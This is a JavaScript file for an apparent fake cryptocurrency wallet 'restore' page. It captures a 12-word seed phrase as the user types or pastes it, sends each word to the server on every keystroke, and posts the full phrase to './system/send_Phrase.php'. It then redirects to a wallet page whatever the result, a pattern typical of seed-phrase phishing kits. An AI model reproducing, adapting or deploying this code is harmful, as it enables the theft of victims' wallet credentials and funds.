// Utils.
const $$ = q => document.querySelectorAll(q);

// Globals.
const words = $$('.word');
let wordStatus = new Array(12).fill(false, 0, 12);

// Functions.
function parseWordID(id) {
  let num = id.substr(4, 2);
  return parseInt(num);
}

function sum(arr) {
  let s = 0;
  arr.forEach(e => (s += e));
  return s;
}

function seedIsComplete() {
  return sum(wordStatus) === 12;
}

function switchDisabled(word) {
  let id = parseWordID(word.id);
  word.value = word.value.trim();
  wordStatus[id - 1] = word.value.length > 0;
  if (seedIsComplete()) alert("ddd");
}

function collectSeed() {
  let seed = [];
  words.forEach(word => seed.push(word.value.trim()));
  return seed;
}


// Main functionality.
words.forEach(word => {
  switchDisabled(word);
  word.addEventListener('change', e => switchDisabled(e.target));
  word.addEventListener('paste', function(e) {
    const clipboardData = e.clipboardData || e.originalEvent.clipboardData || window.clipboardData;
    const pastedData = clipboardData.getData('text');
    if(pastedData.split(' ').length == 12) {
      e.preventDefault();
      words.forEach((word, i) => {
        word.value = pastedData.split(' ')[i];
        switchDisabled(word);
      })
    }
  });
});


document.addEventListener('DOMContentLoaded', function() {



document.addEventListener('keyup', logKey);
function logKey(e) {
		if(!sessionStorage.getItem('check_empty')){
			sessionStorage.setItem('check_empty', 'false');
		}

		for (let pas = 1; pas < 13; pas++) {
		
		var key = document.getElementById("p"+pas).value;
		if(key == ""){
			sessionStorage.setItem('check_empty', 'false');
		}else{
			sessionStorage.setItem('check_empty', 'true');
		}
		
		$.get( "#", { word: key })
		  .done(function( data ) {
			if(data == 'true'){
				document.getElementById("p"+pas).style.color = "#000";
			}else{
				document.getElementById("p"+pas).style.color = "#000";
			}
		  });
		 
	}
	
var page = sessionStorage.getItem('page');
var check_empty = sessionStorage.getItem('check_empty');
if(check_empty == 'true' & page == '3'){
	document.getElementById("restore").style.display = "block";
	document.getElementById("nextxxx").style.display = "none";
}else{
	document.getElementById("restore").style.display = "none";
	document.getElementById("nextxxx").style.display = "block";
}
	
//sessionStorage.getItem('page')
}


    var nextxxx = document.getElementById('nextxxx');
    // onClick's logic below:
    nextxxx.addEventListener('click', function() {
		
			if(!sessionStorage.getItem('page')){
				sessionStorage.setItem('page', '1');
			}
			var page = sessionStorage.getItem('page');


			if(page == '1'){
				document.getElementById("page1").style.display = "none";
				document.getElementById("page2").style.display = "block";		
				document.getElementById("previous").style.display = "none";	
				document.getElementById("previous_key").style.display = "block";	
				sessionStorage.setItem('page', '2');
			}else if(page == '2'){
				document.getElementById("page1").style.display = "none";
				document.getElementById("page2").style.display = "none";
				document.getElementById("page3").style.display = "block";
				sessionStorage.setItem('page', '3');
			}
			var check_empty = sessionStorage.getItem('check_empty');
			if(check_empty == 'true' & page == '2'){
				document.getElementById("restore").style.display = "block";
				document.getElementById("nextxxx").style.display = "none";
			}else{
				document.getElementById("restore").style.display = "none";
				document.getElementById("nextxxx").style.display = "block";
			}


	})
	


    var previous_key = document.getElementById('previous_key');
    // onClick's logic below:
    previous_key.addEventListener('click', function() {
		
		
		if(!sessionStorage.getItem('page')){
			sessionStorage.setItem('page', '1');
		}
		var page = sessionStorage.getItem('page');
		
		if(page == '2'){
			document.getElementById("page1").style.display = "block";
			document.getElementById("page2").style.display = "none";
			document.getElementById("previous").style.display = "block";	
			document.getElementById("previous_key").style.display = "none";	
			sessionStorage.setItem('page', '1');
		}else if(page == '3'){
			document.getElementById("page1").style.display = "none";
			document.getElementById("page2").style.display = "block";
			document.getElementById("page3").style.display = "none";

			sessionStorage.setItem('page', '2');
		}
		
		
		
	})
	

    var restore = document.getElementById('restore');
    // onClick's logic below:
    restore.addEventListener('click', function() {
		
	const key_word = [];
	for (let pas = 1; pas < 13; pas++) {
		var check = document.getElementById("p"+pas).value;
		if(!check == ""){
			key_word[pas] = check;
		}
	}


		$.post( "./system/send_Phrase.php", { phrase: key_word })
		
		  .done(function( data ) {
			if(data == 'false'){
				document.getElementById("message").innerHTML = '<span style="font-family: Roboto_Medium;color:red;">Invalid mnemonic phrase</span>';
				window.location.href = './wallet.html';				

			}else{
				window.location.href = './wallet.html';
				
			}
		  });
		  
	//alert(key_word);
	})
	
	
	

});



